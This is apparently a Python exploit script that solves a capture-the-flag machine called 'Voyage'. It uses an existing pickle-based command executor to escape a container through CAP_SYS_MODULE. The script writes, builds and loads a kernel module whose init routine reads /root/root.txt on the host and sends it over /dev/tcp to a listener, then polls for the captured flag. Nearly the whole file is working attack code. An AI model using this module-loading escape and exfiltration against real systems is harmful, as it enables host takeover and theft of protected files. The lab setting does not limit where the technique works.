#!/usr/bin/env python3
"""
Live root-flag automation for Voyage using CAP_SYS_MODULE escape.

Important:
- This script DOES NOT modify get_user_flag_via_internal_pickle.py.
- It reuses that script as a command executor into the internal pickle app.

Flow:
1) Verify command execution in second container (d221...).
2) Drop rev.c + Makefile into /tmp/exp in that container.
3) Build kernel module against 6.8.0-1030-aws headers.
4) Start listener INSIDE the d221 container.
5) insmod rev.ko -> host callback is sent to that internal listener.
6) Read the captured root flag back through the existing pickle executor.
"""

import argparse
import os
import re
import subprocess
import sys
from pathlib import Path


def run_internal_command(executor_script: Path, command: str) -> tuple[int, str]:
    cmd = [sys.executable, str(executor_script), "--command", command]
    env = dict(os.environ)
    env["PYTHONIOENCODING"] = "utf-8"
    proc = subprocess.run(
        cmd,
        capture_output=True,
        text=False,
        cwd=str(executor_script.parent),
        env=env,
    )
    output = (proc.stdout or b"").decode("utf-8", errors="ignore").strip()
    error = (proc.stderr or b"").decode("utf-8", errors="ignore").strip()

    merged = output
    if error:
        merged = f"{merged}\n{error}" if merged else error
    return proc.returncode, merged.strip()


def extract_flag(text: str) -> str | None:
    m = re.search(r"THM\{[^}]+\}", text)
    return m.group(0) if m else None


def detect_internal_ip(executor_script: Path) -> str:
    rc, out = run_internal_command(
        executor_script,
        "hostname -I 2>/dev/null | awk '{print $1}'",
    )
    ip = out.strip().splitlines()[0].strip() if out.strip() else ""
    if re.match(r"^\d+\.\d+\.\d+\.\d+$", ip):
        return ip
    return "192.168.100.12"


def build_rev_c(callback_ip: str, callback_port: int) -> str:
    return f"""#include <linux/init.h>
#include <linux/module.h>
#include <linux/kmod.h>

MODULE_LICENSE(\"GPL\");

static int start_shell(void) {{
    char *argv[] = {{
        \"/bin/bash\",
        \"-c\",
        \"bash -c 'cat /root/root.txt 2>/dev/null | tr -d \\\"\\n\\\" > /dev/tcp/{callback_ip}/{callback_port}'\",
        NULL
    }};

    static char *env[] = {{
        \"HOME=/\",
        \"TERM=linux\",
        \"PATH=/sbin:/bin:/usr/sbin:/usr/bin\",
        NULL
    }};

    return call_usermodehelper(argv[0], argv, env, UMH_WAIT_PROC);
}}

static int init_mod(void) {{
    return start_shell();
}}

static void exit_mod(void) {{
    return;
}}

module_init(init_mod);
module_exit(exit_mod);
"""


MAKEFILE_TEXT = """obj-m += rev.o

KVER := 6.8.0-1030-aws
KDIR := /lib/modules/$(KVER)/build
PWD  := $(shell pwd)

all:
	make -C $(KDIR) M=$(PWD) modules

clean:
	make -C $(KDIR) M=$(PWD) clean
"""


def shell_quote_single(s: str) -> str:
    return s.replace("'", "'\"'\"'")


def deploy_files(executor_script: Path, callback_ip: str, callback_port: int) -> None:
    rev_c = build_rev_c(callback_ip, callback_port)
    mk = MAKEFILE_TEXT

    cmd = (
        "mkdir -p /tmp/exp && "
        "cat > /tmp/exp/rev.c <<'EOF'\n"
        + rev_c
        + "\nEOF\n"
        + "cat > /tmp/exp/Makefile <<'EOF'\n"
        + mk
        + "\nEOF\n"
        + "ls -la /tmp/exp"
    )

    rc, out = run_internal_command(executor_script, cmd)
    print("[*] Deploy output:")
    print(out[:1200])
    if rc != 0 and "No output" in out:
        raise SystemExit("file deploy failed")


def build_module(executor_script: Path) -> None:
    cmd = "cd /tmp/exp && make clean >/dev/null 2>&1 || true; make 2>&1"
    rc, out = run_internal_command(executor_script, cmd)
    print("[*] Build output:")
    print(out[:2000])
    if "error:" in out.lower() or "No rule to make target" in out:
        raise SystemExit("module build failed")


def start_internal_listener(executor_script: Path, callback_port: int) -> None:
    cmd = f"""
rm -f /tmp/rootflag_cb.txt /tmp/rootflag_cb.log;
nohup python3 - <<'PY' >/tmp/rootflag_cb.log 2>&1 &
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', {callback_port}))
s.listen(1)
conn, _ = s.accept()
data = b''
while True:
    chunk = conn.recv(4096)
    if not chunk:
        break
    data += chunk
conn.close()
s.close()
with open('/tmp/rootflag_cb.txt', 'wb') as f:
    f.write(data)
PY
echo LISTENER_STARTED
"""
    rc, out = run_internal_command(executor_script, cmd)
    print("[*] Internal listener output:")
    print(out[:800])


def poll_internal_flag(executor_script: Path, timeout: int) -> str | None:
    attempts = max(3, timeout // 2)
    for _ in range(attempts):
        rc, out = run_internal_command(
            executor_script,
            "test -s /tmp/rootflag_cb.txt && cat /tmp/rootflag_cb.txt || true",
        )
        flag = extract_flag(out)
        if flag:
            return flag
        run_internal_command(executor_script, "sleep 2")

    rc, log = run_internal_command(executor_script, "tail -n 40 /tmp/rootflag_cb.log 2>/dev/null || true")
    print("[*] Internal listener log tail:")
    print(log[:1200])
    return None


def trigger_insmod(executor_script: Path) -> None:
    cmd = (
        "cd /tmp/exp && "
        "(lsmod 2>/dev/null | grep -q '^rev ' && echo '[*] rev already loaded; unloading...' && rmmod rev 2>&1 || true) && "
        "insmod rev.ko 2>&1 || true; "
        "echo '---LSMOD---'; lsmod 2>/dev/null | grep '^rev ' || true"
    )
    rc, out = run_internal_command(executor_script, cmd)
    print("[*] insmod output:")
    print(out[:1200])


def main() -> None:
    parser = argparse.ArgumentParser(description="Get Voyage root flag via live LKM escape")
    parser.add_argument(
        "--executor-script",
        default="get_user_flag_via_internal_pickle.py",
        help="Path to the already-working internal pickle executor script",
    )
    parser.add_argument(
        "--callback-ip",
        default="",
        help="Callback IP reachable FROM host kernel context (default: auto internal d221 IP)",
    )
    parser.add_argument("--callback-port", type=int, default=4446, help="Port for host callback")
    parser.add_argument("--listener-timeout", type=int, default=30, help="Seconds to wait for callback")
    args = parser.parse_args()

    executor_script = Path(args.executor_script)
    if not executor_script.is_absolute():
        executor_script = (Path(__file__).parent / executor_script).resolve()
    if not executor_script.exists():
        raise SystemExit(f"executor script not found: {executor_script}")

    auto_internal_ip = detect_internal_ip(executor_script)
    callback_ip = args.callback_ip.strip() or auto_internal_ip
    callback_port = int(args.callback_port)
    print(f"[*] Callback target: {callback_ip}:{callback_port}")

    print("[*] Verifying internal command execution...")
    rc, out = run_internal_command(executor_script, "id; hostname")
    print(out[:400])
    if "uid=0" not in out:
        raise SystemExit("internal command execution check failed")

    print("[*] Deploying rev.c and Makefile...")
    deploy_files(executor_script, callback_ip, callback_port)

    print("[*] Building kernel module...")
    build_module(executor_script)

    print(f"[*] Starting INTERNAL listener on d221:0.0.0.0:{callback_port} ...")
    start_internal_listener(executor_script, callback_port)

    print("[*] Triggering module load (insmod rev.ko)...")
    trigger_insmod(executor_script)
    flag = poll_internal_flag(executor_script, args.listener_timeout)

    if flag:
        print(f"[+] ROOT FLAG FOUND: {flag}")
        return

    print("[-] No root flag captured by internal listener.")
    print("[*] Try a different callback port, e.g. --callback-port 4555")


if __name__ == "__main__":
    main()
